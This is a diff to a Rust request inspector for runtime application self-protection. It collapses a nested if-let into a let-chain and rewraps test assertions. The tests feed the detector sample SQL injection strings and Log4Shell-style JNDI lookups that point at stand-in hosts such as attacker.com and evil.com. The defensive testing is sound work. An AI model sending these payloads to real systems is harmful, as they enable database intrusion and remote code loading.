@@ -83,10 +83,10 @@ impl RaspInspector {
             if name == "cookie" || name == "authorization" {
                 continue;
             }
-            if let Ok(v_str) = val.to_str() {
-                if Self::inspect_text(v_str) {
-                    return true;
-                }
+            if let Ok(v_str) = val.to_str()
+                && Self::inspect_text(v_str)
+            {
+                return true;
             }
         }
         false
@@ -170,7 +170,9 @@ mod tests {
             "/api/users?q=UNION SELECT * FROM passwords"
         ));
         assert!(RaspInspector::inspect_uri("/login?user=admin' OR '1'='1"));
-        assert!(RaspInspector::inspect_text("SELECT * FROM users WHERE id = 1; SLEEP(5);"));
+        assert!(RaspInspector::inspect_text(
+            "SELECT * FROM users WHERE id = 1; SLEEP(5);"
+        ));
         assert!(!RaspInspector::inspect_uri("/api/users?id=123"));
     }
 
@@ -184,7 +186,9 @@ mod tests {
 
     #[test]
     fn test_rasp_jndi_detection() {
-        assert!(RaspInspector::inspect_text("${jndi:ldap://attacker.com/exploit}"));
+        assert!(RaspInspector::inspect_text(
+            "${jndi:ldap://attacker.com/exploit}"
+        ));
         assert!(RaspInspector::inspect_text("${rmi://evil.com:1099/obj}"));
     }
 
